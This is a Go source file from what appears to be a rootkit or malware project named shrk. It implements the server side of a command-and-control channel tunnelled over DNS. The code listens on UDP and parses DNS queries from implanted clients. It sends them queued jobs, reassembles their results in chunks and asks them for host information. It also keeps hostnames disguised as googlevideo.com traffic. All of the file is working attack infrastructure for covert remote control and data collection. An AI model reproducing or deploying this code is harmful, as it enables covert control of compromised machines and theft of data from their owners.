package c2

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/ngn13/shrk/server/config"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
)

type Type struct {
	Conn *net.UDPConn   // UDP connection
	Conf *config.Type   // config
	Data *database.Type // database
	Jobs *joblist.Type  // job list
	Mut  *sync.Mutex
}

var FakeLabels [][3]string = [][3]string{
	{"rr1---sn-nja7sne6", "googlevideo", "com"},
	{"rr2---sn-njaeyn7s", "googlevideo", "com"},
	{"rr3---sn-nja7snll", "googlevideo", "com"},
}

func New(conf *config.Type, data *database.Type, jbs *joblist.Type) (*Type, error) {
	var c2 Type = Type{
		Conn: nil,
		Conf: conf,
		Data: data,
		Jobs: jbs,
	}
	return &c2, nil
}

func (c2 *Type) jobDebg(c *database.Client, j *joblist.Job, f string, v ...any) {
	if !c2.Conf.Debug {
		return
	}

	msg := fmt.Sprintf(f, v...)
	log.Debg("[client: %s] [job: %s] %s", c.ID, j.ID, msg)
}

func (c2 *Type) clientDebg(c *database.Client, f string, v ...any) {
	if !c2.Conf.Debug {
		return
	}

	msg := fmt.Sprintf(f, v...)
	log.Debg("[client: %s] %s", c.ID, msg)
}

func (c2 *Type) conDebg(c *net.UDPAddr, f string, v ...any) {
	if !c2.Conf.Debug {
		return
	}

	msg := fmt.Sprintf(f, v...)
	log.Debg("[connection: %s] %s", c.String(), msg)
}

func (c2 *Type) send(con *net.UDPAddr, packet *DNS_Packet, client *database.Client, job *joblist.Job, buf *bytes.Buffer) error {
	var err error

	if err = c2.ToResponse(packet, client, job); err != nil {
		return fmt.Errorf("failed to create a response: %s", err.Error())
	}

	buf.Reset()

	if err = packet.Write(buf); err != nil {
		return fmt.Errorf("failed write DNS packet to buffer: %s", err.Error())
	}

	if _, err = c2.Conn.WriteToUDP(buf.Bytes(), con); err != nil {
		return fmt.Errorf("failed to send the DNS packet: %s", err.Error())
	}

	return nil
}

func (c2 *Type) sendNameError(con *net.UDPAddr, packet *DNS_Packet, buf *bytes.Buffer) error {
	var err error

	packet.Header.Flags = 0
	packet.Header.Flags |= 0b10000001 << 8
	packet.Header.Flags |= 0b10000011

	packet.Header.NSCount = 0
	packet.Header.ANCount = 0
	packet.Header.ARCount = 0

	buf.Reset()

	if err = packet.Write(buf); err != nil {
		return fmt.Errorf("failed write DNS packet to buffer: %s", err.Error())
	}

	if _, err = c2.Conn.WriteToUDP(buf.Bytes(), con); err != nil {
		return fmt.Errorf("failed to send the DNS packet: %s", err.Error())
	}

	return nil
}

func (c2 *Type) HandleClient(con *net.UDPAddr, buf *bytes.Buffer) {
	var (
		packet *DNS_Packet
		req    *Request
		client *database.Client
		job    *joblist.Job

		err error
	)

	packet = &DNS_Packet{}

	if err = packet.Read(buf); err != nil {
		c2.conDebg(con, "invalid DNS request: %s", err.Error())
		if err = c2.sendNameError(con, packet, buf); err != nil {
			c2.conDebg(con, "failed to send the name error response: %s", err.Error())
		}
		return
	}

	if req, client, job, err = c2.ToRequest(packet); err != nil {
		c2.conDebg(con, "invalid C2 request: %s", err.Error())
		if err = c2.sendNameError(con, packet, buf); err != nil {
			c2.conDebg(con, "failed to send the name error response: %s", err.Error())
		}
		return
	}

	// send a new job
	if nil == job {
		job, _ = c2.Jobs.Find(client.ID)
		c2.clientDebg(client, "requested for a job")

		if err = c2.send(con, packet, client, job, buf); err != nil {
			c2.clientDebg(client, "failed to send the job: %s", err.Error())
			return
		}

		if nil != job {
			c2.clientDebg(client, "sent the job (id: %s, pid: %d)", job.ID, job.PacketID)
		} else {
			c2.clientDebg(client, "sent any empty response (no available jobs)")
		}

		goto done
	}

	// if the current job is already completed, then this is an invalid request
	if job.Done {
		c2.jobDebg(client, job, "job is already completed, ignoring")
		goto done
	}

	c2.jobDebg(client, job, "packet data (pid: %d, len: %d): %s\n", req.PacketID, len(req.Data), req.Data)

	// if packet ID doesn't match, then we missed a packet, reset
	if req.PacketID != job.PacketID {
		c2.jobDebg(client, job, "bad packet ID, resetting result buffer (got: %d, expected: %d)", req.PacketID, job.PacketID)
		job.PacketID = 0
		job.Result.Seek(0, io.SeekStart)

		if req.PacketID != 0 {
			goto done
		}
	}

	// if everything is fine just save the result and continue
	c2.jobDebg(client, job, "received a valid result (pid: %d, done: %t)", req.PacketID, req.IsLast)
	job.Result.Write(req.Data)
	job.Done = req.IsLast
	job.PacketID++

	// update the DoneChan for anyone waiting for the job
	if job.Done = req.IsLast; job.Done {
		job.DoneChan <- true
	}

	if err = c2.send(con, packet, client, nil, buf); err != nil {
		c2.jobDebg(client, job, "failed to acknowledge the job result")
	}

done:
	if nil == client {
		return
	}

	// add the connection and save the client data
	client.NewCon(con)
	c2.Data.Save()

	if (job != nil && job.Command == joblist.CMD_INFO) || client.HasInfo {
		return
	}

	// request for client info if we don't have any
	if err = client.GetInfo(c2.Jobs); err != nil {
		c2.clientDebg(client, "failed to get client info: %s", err.Error())
	}

	c2.Data.Save()
}

func (c2 *Type) Handle() {
	defer c2.Conn.Close()

	for {
		var (
			req  []byte
			size int
			con  *net.UDPAddr
			err  error
		)

		req = make([]byte, DNS_UDP_LIMIT)

		if size, con, err = c2.Conn.ReadFromUDP(req); err != nil {
			log.Debg("failed to read UDP connection: %s", err.Error())
			continue
		}

		c2.conDebg(con, "received %d bytes", size)
		go c2.HandleClient(con, bytes.NewBuffer(req))
	}
}

func (c2 *Type) Listen(_addr string) error {
	var (
		addr *net.UDPAddr
		err  error
	)

	if addr, err = net.ResolveUDPAddr("udp", _addr); err != nil {
		return err
	}

	if c2.Conn, err = net.ListenUDP("udp", addr); err != nil {
		return err
	}

	go c2.Handle()
	return nil
}
